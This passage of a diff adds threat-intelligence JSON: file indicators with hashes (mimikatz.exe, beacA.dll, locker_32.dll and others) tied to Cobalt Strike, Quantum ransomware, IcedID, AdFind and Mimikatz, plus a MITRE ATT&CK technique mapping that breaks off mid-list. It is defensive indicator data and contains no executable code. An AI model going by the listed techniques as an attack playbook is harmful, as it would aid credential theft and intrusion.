+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "9bd6b1f24b9589a3fbc1d54b6e6184b8",
+     "sha1": "f8473c6c8b298a3d72c8ca890667eddab62d2ba8",
+     "sha256": "03a9d6afc99e70333723d921bd1265ac948cdabb8b15689b5ceb1c02365a9572"
+    },
+    "name": "Nigu.exe",
+    "nameList": [
+     "Nigu.exe"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "Nigu.exe"
+   ],
+   "seqUpdate": 16951700705704,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "adc50d0c1e7bf37288a612a0f278e028",
+    "other": [],
+    "sha1": "6254e8cca47d87f29e85627a08ba88b79915a459",
+    "sha256": "fafc84466c1ce361bb6ce219bde2b64ca07a6a6feda23f444749ba06c44b0580"
+   },
+   "id": "d08dfe9937c600051f1b1ec2ac5b9ed2af7b9b7b",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "adc50d0c1e7bf37288a612a0f278e028",
+     "sha1": "6254e8cca47d87f29e85627a08ba88b79915a459",
+     "sha256": "fafc84466c1ce361bb6ce219bde2b64ca07a6a6feda23f444749ba06c44b0580"
+    },
+    "name": "lsass.dll",
+    "nameList": [
+     "lsass.dll"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "lsass.dll"
+   ],
+   "seqUpdate": 16951700708071,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-01-09",
+   "dateLastSeen": "2026-05-25",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "df5ce1159ef2e257df92e1825d786d87",
+    "other": [],
+    "sha1": "a7e163eaa0fc2afb9c0d5ac6f79cb3e49919dd3c",
+    "sha256": "842737b5c36f624c9420a005239b04876990a2c4011db87fe67504fa09281031"
+   },
+   "id": "f8f69cee08773d91b339ca492084651f921bae7a",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "df5ce1159ef2e257df92e1825d786d87",
+     "sha1": "a7e163eaa0fc2afb9c0d5ac6f79cb3e49919dd3c",
+     "sha256": "842737b5c36f624c9420a005239b04876990a2c4011db87fe67504fa09281031"
+    },
+    "name": "842737b5c36f624c9420a005239b04876990a2c4011db87fe67504fa09281031",
+    "nameList": [
+     "842737b5c36f624c9420a005239b04876990a2c4011db87fe67504fa09281031"
+    ],
+    "size": null
+   },
+   "malwareIdList": [
+    "1f21cb2fdd76159d7e5b387c8541181e009fbf35"
+   ],
+   "malwareList": [
+    {
+     "category": [],
+     "class": null,
+     "id": "1f21cb2fdd76159d7e5b387c8541181e009fbf35",
+     "name": "AdFind",
+     "platform": [],
+     "threatLevel": null
+    }
+   ],
+   "potentialNames": [
+    "842737b5c36f624c9420a005239b04876990a2c4011db87fe67504fa09281031"
+   ],
+   "seqUpdate": 17810053374948,
+   "size": null,
+   "sources": [
+    "tap"
+   ],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "92edbbeff775928cfc6e3c8efefe4ecc",
+    "other": [],
+    "sha1": "fffa0ce086791c41360971e3ce6a0d1af1701616",
+    "sha256": "fc4da07183de876a2b8ed1b35ec1e2657400da9d99a313452162399c519dbfc6"
+   },
+   "id": "351f0f8d82371bc1408f1bed4ad67a1e6199f778",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "92edbbeff775928cfc6e3c8efefe4ecc",
+     "sha1": "fffa0ce086791c41360971e3ce6a0d1af1701616",
+     "sha256": "fc4da07183de876a2b8ed1b35ec1e2657400da9d99a313452162399c519dbfc6"
+    },
+    "name": "adget-1.exe",
+    "nameList": [
+     "adget-1.exe"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "adget-1.exe"
+   ],
+   "seqUpdate": 16951700705039,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "955d0cf317efe48bf0394330fcd82ebb",
+    "other": [],
+    "sha1": "d84d40038311e188e25c78389b51b900de9c69bd",
+    "sha256": "e9da08831e0d4395f697e4f18c87be941bf52c79d84da1cc88186bdea1ebf4f4"
+   },
+   "id": "9aaaacb35c7216920b2d44f4d497b53a9b4ee172",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "955d0cf317efe48bf0394330fcd82ebb",
+     "sha1": "d84d40038311e188e25c78389b51b900de9c69bd",
+     "sha256": "e9da08831e0d4395f697e4f18c87be941bf52c79d84da1cc88186bdea1ebf4f4"
+    },
+    "name": "lsasss.exe",
+    "nameList": [
+     "lsasss.exe"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "lsasss.exe"
+   ],
+   "seqUpdate": 16951700707553,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-01-09",
+   "dateLastSeen": "2026-05-25",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "131d277cfbc9f4b2d667150d84ad503d",
+    "other": [],
+    "sha1": "f05ff93ee4d2f31bc70c0484a559d562203b7700",
+    "sha256": "a378b8e9173f4a5469e7b5105be40723af29cbd6ee00d3b13ff437dae4514dff"
+   },
+   "id": "18cc5a535e03093c49a4df5e42685568a8363213",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "131d277cfbc9f4b2d667150d84ad503d",
+     "sha1": "f05ff93ee4d2f31bc70c0484a559d562203b7700",
+     "sha256": "a378b8e9173f4a5469e7b5105be40723af29cbd6ee00d3b13ff437dae4514dff"
+    },
+    "name": "locker_32.dll",
+    "nameList": [
+     "locker_32.dll"
+    ],
+    "size": null
+   },
+   "malwareIdList": [
+    "3d86fa0fce495ea07d119f7e381e1c857b69de29"
+   ],
+   "malwareList": [
+    {
+     "category": [],
+     "class": null,
+     "id": "3d86fa0fce495ea07d119f7e381e1c857b69de29",
+     "name": "Quantum",
+     "platform": [],
+     "threatLevel": null
+    }
+   ],
+   "potentialNames": [
+    "locker_32.dll"
+   ],
+   "seqUpdate": 17809989932028,
+   "size": null,
+   "sources": [
+    "tap"
+   ],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "e77f23aac8db0d23196b6bef64fe04fc",
+    "other": [],
+    "sha1": "90bf77e194970dd74d1b49faf58ae395ce49bb34",
+    "sha256": "c2ebcc389304539bc13c3d2023cf88f9ea0bac7210fefa03f8333eaab0bbb76d"
+   },
+   "id": "5e014c0438031aa243ea1eba757ccf359c0a4f27",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "e77f23aac8db0d23196b6bef64fe04fc",
+     "sha1": "90bf77e194970dd74d1b49faf58ae395ce49bb34",
+     "sha256": "c2ebcc389304539bc13c3d2023cf88f9ea0bac7210fefa03f8333eaab0bbb76d"
+    },
+    "name": "AD.bat",
+    "nameList": [
+     "AD.bat"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "AD.bat"
+   ],
+   "seqUpdate": 16951700719403,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "397020072f5787dbbc0c344f98623bbd",
+    "other": [],
+    "sha1": "970e793c86266b20d280c04e0f41ec7ae9c2093c",
+    "sha256": "6511d6e84343c2d3a4cd36853170509e2751e27c86f67c6a031dc88e7e495e48"
+   },
+   "id": "ce69436bc89a3d6ca00657a42a24a5b26dfe4568",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "397020072f5787dbbc0c344f98623bbd",
+     "sha1": "970e793c86266b20d280c04e0f41ec7ae9c2093c",
+     "sha256": "6511d6e84343c2d3a4cd36853170509e2751e27c86f67c6a031dc88e7e495e48"
+    },
+    "name": "mimikatz.exe",
+    "nameList": [
+     "mimikatz.exe"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "mimikatz.exe"
+   ],
+   "seqUpdate": 16951700704284,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-01-09",
+   "dateLastSeen": "2026-05-25",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "1b1497c2758ff5a8ade2df336a7a6c2d",
+    "other": [],
+    "sha1": "d6cc874f84797813c225318b877eace04ca5f5a1",
+    "sha256": "47ed0d1c7d8abc159d1eb2bb9fbe037f38b0846217cc11132652734f93ad5678"
+   },
+   "id": "0479e1294355495fc384eaf3ce17065986100562",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "1b1497c2758ff5a8ade2df336a7a6c2d",
+     "sha1": "d6cc874f84797813c225318b877eace04ca5f5a1",
+     "sha256": "47ed0d1c7d8abc159d1eb2bb9fbe037f38b0846217cc11132652734f93ad5678"
+    },
+    "name": "beacA.dll",
+    "nameList": [
+     "beacA.dll"
+    ],
+    "size": null
+   },
+   "malwareIdList": [
+    "b69fc9d439d2fd41e98a7e3c60b9a55340012eb6"
+   ],
+   "malwareList": [
+    {
+     "category": [],
+     "class": null,
+     "id": "b69fc9d439d2fd41e98a7e3c60b9a55340012eb6",
+     "name": "Cobalt Strike",
+     "platform": [],
+     "threatLevel": null
+    }
+   ],
+   "potentialNames": [
+    "beacA.dll"
+   ],
+   "seqUpdate": 17810072720739,
+   "size": null,
+   "sources": [
+    "tap"
+   ],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "f102a95e749d1ee63c71df902856ae51",
+    "other": [],
+    "sha1": "fda81b5951bb02ef0236088c310d9bc4fa70e1e6",
+    "sha256": "f27d924911a7087928012764358bad9240b2ba8aeeca5e0d717abdbb82344981"
+   },
+   "id": "aca35b5b46c50ce88cc23003de61b0effee79d0d",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "f102a95e749d1ee63c71df902856ae51",
+     "sha1": "fda81b5951bb02ef0236088c310d9bc4fa70e1e6",
+     "sha256": "f27d924911a7087928012764358bad9240b2ba8aeeca5e0d717abdbb82344981"
+    },
+    "name": "easygoing.dat",
+    "nameList": [
+     "easygoing.dat"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "easygoing.dat"
+   ],
+   "seqUpdate": 16951700709000,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "ce1b0e77a31da8dc68f77a977b04f3e4",
+    "other": [],
+    "sha1": "5facd0aa9a29e0768ab9f432c79eac173af69711",
+    "sha256": "163800b0fbf1b1b7bbc7f719df421ed717111c7c9ddea9c9b41f898ee22dd51a"
+   },
+   "id": "40f79811677a456ba8adb8b01c64a395c18b450b",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "ce1b0e77a31da8dc68f77a977b04f3e4",
+     "sha1": "5facd0aa9a29e0768ab9f432c79eac173af69711",
+     "sha256": "163800b0fbf1b1b7bbc7f719df421ed717111c7c9ddea9c9b41f898ee22dd51a"
+    },
+    "name": "rapuab1.dll",
+    "nameList": [
+     "rapuab1.dll"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "rapuab1.dll"
+   ],
+   "seqUpdate": 16951700709365,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "7ac356035fce31e9e14c3a3d371ddf41",
+    "other": [],
+    "sha1": "61f838d9b0998ab23877e86f6e8ba3551799e07c",
+    "sha256": "4f52c7448bdcb4caa2eff701b0f3b60b406aea278ecd5a3b23cac808a65418e7"
+   },
+   "id": "a87059869040bb447f18ab4fb119c2456ea2ca50",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "7ac356035fce31e9e14c3a3d371ddf41",
+     "sha1": "61f838d9b0998ab23877e86f6e8ba3551799e07c",
+     "sha256": "4f52c7448bdcb4caa2eff701b0f3b60b406aea278ecd5a3b23cac808a65418e7"
+    },
+    "name": "ns.bat",
+    "nameList": [
+     "ns.bat"
+    ],
+    "size": null
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "potentialNames": [
+    "ns.bat"
+   ],
+   "seqUpdate": 16951700719943,
+   "size": null,
+   "sources": [],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  }
+ ],
+ "indicatorsIds": [
+  "54bf357860bab474a3f8f55a25c33e94d2a3bb70",
+  "98e4de83c180d1c473d9c7a0b863370b7517d70a",
+  "5b5918cb3bdd3c76cb584f5554b0afff37272d95",
+  "cbe93ec794da606eda9479aafe501589f588f4d0",
+  "99bb61a491f5fa8d2c2c83aa081eaa28ee5c92f9",
+  "5fac981f9e85bee4d626d1ff9bbc77cfb12079c7",
+  "4699dd6e374a7ef57be3ee1f0a750efd279ffa4b",
+  "f632482bfee6e8a635a4883185d81a30a7e40021",
+  "49bf3f87a0e0c596d84b5d870023c4c2f9931e87",
+  "3c8260d381b2539095be463bf59c1b4746517213",
+  "c7dbf12af1919fd764b3c84274a12b5a0a9d807c",
+  "27d7d74d20e3eb9b42ddab93fc3f205970423861",
+  "60c8b09054f2682505dfe437512f127a8973b5ef",
+  "30af90bddbb936820d57af842078f7304e4ac984",
+  "a9c8b5fb9c500bcc45022e4352c5efc8e1b0bcd9",
+  "e20c8cc81b83da0864932d3e264b9b1d8ba9f643",
+  "96d6eb3e5cb81796fff27990022334c53f876807",
+  "7c57d90c8808498884071d9b4c36b103ff9b5416",
+  "47fc518df5c06c89821d85c01bb9835016ace812",
+  "5302b9983e82114b5325e52942ead83db774d864",
+  "5682998a6d0c193d943af15f21b37315e10b200e",
+  "86df37868b9c711f36fb01a438fdb550384c2b05",
+  "b464462341f8234082dfa7b89a3372d33703c2e8",
+  "c80b4a1ece4f694cd9dcc6d829029e1dd969fac3",
+  "d08dfe9937c600051f1b1ec2ac5b9ed2af7b9b7b",
+  "f8f69cee08773d91b339ca492084651f921bae7a",
+  "351f0f8d82371bc1408f1bed4ad67a1e6199f778",
+  "9aaaacb35c7216920b2d44f4d497b53a9b4ee172",
+  "18cc5a535e03093c49a4df5e42685568a8363213",
+  "5e014c0438031aa243ea1eba757ccf359c0a4f27",
+  "ce69436bc89a3d6ca00657a42a24a5b26dfe4568",
+  "0479e1294355495fc384eaf3ce17065986100562",
+  "aca35b5b46c50ce88cc23003de61b0effee79d0d",
+  "40f79811677a456ba8adb8b01c64a395c18b450b",
+  "a87059869040bb447f18ab4fb119c2456ea2ca50"
+ ],
+ "isAutogen": false,
+ "isPublished": true,
+ "isTailored": false,
+ "labels": [],
+ "langs": [
+  "en"
+ ],
+ "malwareList": [
+  {
+   "category": [
+    "Framework"
+   ],
+   "class": "",
+   "id": "b69fc9d439d2fd41e98a7e3c60b9a55340012eb6",
+   "name": "Cobalt Strike",
+   "platform": [
+    "Windows"
+   ],
+   "threatLevel": "High"
+  },
+  {
+   "category": [],
+   "class": "",
+   "id": "1f21cb2fdd76159d7e5b387c8541181e009fbf35",
+   "name": "AdFind",
+   "platform": [],
+   "threatLevel": "Low"
+  },
+  {
+   "category": [
+    "Ransomware"
+   ],
+   "class": null,
+   "id": "3d86fa0fce495ea07d119f7e381e1c857b69de29",
+   "name": "Quantum",
+   "platform": [],
+   "threatLevel": "Medium"
+  },
+  {
+   "category": [
+    "banking trojan"
+   ],
+   "class": "",
+   "id": "e254c7b6978f298cca0e319b26fa414c2d14a3c8",
+   "name": "IcedID",
+   "platform": [
+    "Windows"
+   ],
+   "threatLevel": "Medium"
+  },
+  {
+   "category": [],
+   "class": "",
+   "id": "ec9fee47877add16204fd87a3b41ace8fdbec3db",
+   "name": "Mimikatz",
+   "platform": [
+    "Windows"
+   ],
+   "threatLevel": "Low"
+  }
+ ],
+ "mitreMatrix": [
+  {
+   "attackName": "[Phishing for Information->Spearphishing Attachment]",
+   "attackPatternId": "attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc",
+   "attackTactic": "reconnaissance",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1598.002",
+   "params": null
+  },
+  {
+   "attackName": "Phishing for Information",
+   "attackPatternId": "attack-pattern--cca0ccb6-a068-4574-a722-b1556f86833a",
+   "attackTactic": "reconnaissance",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1598",
+   "params": null
+  },
+  {
+   "attackName": "Windows Management Instrumentation",
+   "attackPatternId": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1047",
+   "params": null
+  },
+  {
+   "attackName": "[Command and Scripting Interpreter->Windows Command Shell]",
+   "attackPatternId": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1059.003",
+   "params": null
+  },
+  {
+   "attackName": "Command and Scripting Interpreter",
+   "attackPatternId": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1059",
+   "params": null
+  },
+  {
+   "attackName": "[User Execution->Malicious File]",
+   "attackPatternId": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1204.002",
+   "params": null
+  },
+  {
+   "attackName": "User Execution",
+   "attackPatternId": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1204",
+   "params": null
+  },
+  {
+   "attackName": "[Event Triggered Execution->PowerShell Profile]",
+   "attackPatternId": "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3",
+   "attackTactic": "privilege-escalation",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1546.013",
+   "params": null
+  },
+  {
+   "attackName": "[Event Triggered Execution->PowerShell Profile]",
+   "attackPatternId": "attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3",
+   "attackTactic": "persistence",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1546.013",
+   "params": null
+  },
+  {
+   "attackName": "Event Triggered Execution",
+   "attackPatternId": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
+   "attackTactic": "privilege-escalation",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1546",
+   "params": null
+  },
+  {
+   "attackName": "Event Triggered Execution",
+   "attackPatternId": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
+   "attackTactic": "persistence",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1546",
+   "params": null
+  },
+  {
+   "attackName": "[System Services->Service Execution]",
+   "attackPatternId": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1569.002",
+   "params": null
+  },
+  {
+   "attackName": "System Services",
+   "attackPatternId": "attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1569",
+   "params": null
+  },
+  {
+   "attackName": "Scheduled Task/Job",
+   "attackPatternId": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1053",
+   "params": null
+  },
+  {
+   "attackName": "Scheduled Task/Job",
+   "attackPatternId": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
+   "attackTactic": "persistence",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1053",
+   "params": null
+  },
+  {
+   "attackName": "Scheduled Task/Job",
+   "attackPatternId": "attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9",
+   "attackTactic": "privilege-escalation",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1053",
+   "params": null
+  },
+  {
+   "attackName": "[Scheduled Task/Job->Scheduled Task]",
+   "attackPatternId": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
+   "attackTactic": "execution",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1053.005",
+   "params": null
+  },
+  {
+   "attackName": "[Scheduled Task/Job->Scheduled Task]",
+   "attackPatternId": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
+   "attackTactic": "persistence",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1053.005",
+   "params": null
+  },
+  {
+   "attackName": "[Scheduled Task/Job->Scheduled Task]",
+   "attackPatternId": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
+   "attackTactic": "privilege-escalation",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1053.005",
+   "params": null
+  },
+  {
+   "attackName": "Exploitation for Privilege Escalation",
+   "attackPatternId": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
+   "attackTactic": "privilege-escalation",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1068",
+   "params": null
+  },
+  {
+   "attackName": "Access Token Manipulation",
+   "attackPatternId": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1134",
+   "params": null
+  },
+  {
+   "attackName": "Access Token Manipulation",
+   "attackPatternId": "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48",
+   "attackTactic": "privilege-escalation",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1134",
+   "params": null
+  },
+  {
+   "attackName": "[System Binary Proxy Execution->Regsvr32]",
+   "attackPatternId": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1218.010",
+   "params": null
+  },
+  {
+   "attackName": "System Binary Proxy Execution",
+   "attackPatternId": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1218",
+   "params": null
+  },
+  {
+   "attackName": "[System Binary Proxy Execution->Rundll32]",
+   "attackPatternId": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1218.011",
+   "params": null
+  },
+  {
+   "attackName": "[OS Credential Dumping->DCSync]",
+   "attackPatternId": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163",
+   "attackTactic": "credential-access",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1003.006",
+   "params": null
+  },
+  {
+   "attackName": "OS Credential Dumping",
+   "attackPatternId": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
+   "attackTactic": "credential-access",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1003",
+   "params": null
+  },
+  {
+   "attackName": "[OS Credential Dumping->LSASS Memory]",
+   "attackPatternId": "attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90",
+   "attackTactic": "credential-access",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1003.001",
+   "params": null
+  },
+  {
+   "attackName": "Domain Trust Discovery",
+   "attackPatternId": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1482",
+   "params": null
+  },
+  {
+   "attackName": "System Information Discovery",
+   "attackPatternId": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1082",
+   "params": null
+  },
+  {
+   "attackName": "Remote System Discovery",
+   "attackPatternId": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1018",
+   "params": null
+  },
+  {
+   "attackName": "Group Policy Discovery",
+   "attackPatternId": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1615",
+   "params": null
+  },
+  {
+   "attackName": "[System Location Discovery->System Language Discovery]",
+   "attackPatternId": "attack-pattern--c1b68a96-3c48-49ea-a6c0-9b27359f9c19",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1614.001",
+   "params": null
+  },
+  {
+   "attackName": "System Location Discovery",
+   "attackPatternId": "attack-pattern--c877e33f-1df6-40d6-b1e7-ce70f16f4979",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1614",
+   "params": null
+  },
+  {
+   "attackName": "System Time Discovery",
+   "attackPatternId": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1124",
+   "params": null
+  },
+  {
+   "attackName": "Network Share Discovery",
+   "attackPatternId": "attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f",
+   "attackTactic": "discovery",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1135",
+   "params": null
+  },
+  {
+   "attackName": "[Valid Accounts->Domain Accounts]",
+   "attackPatternId": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
+   "attackTactic": "defense-evasion",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1078.002",
+   "params": null
+  },
+  {
+   "attackName": "[Valid Accounts->Domain Accounts]",
+   "attackPatternId": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
+   "attackTactic": "persistence",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1078.002",
+   "params": null
+  },
+  {
+   "attackName": "[Valid Accounts->Domain Accounts]",
+   "attackPatternId": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
+   "attackTactic": "privilege-escalation",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1078.002",
+   "params": null
+  },
+  {
+   "attackName": "[Valid Accounts->Domain Accounts]",
+   "attackPatternId": "attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f",
+   "attackTactic": "initial-access",
+   "attackType": "enterprise_tactics",
+   "id": null,
+   "mitreId": "T1078.002",
+   "params": null
+  },
+  {
+   "attackName": "Valid Accounts",
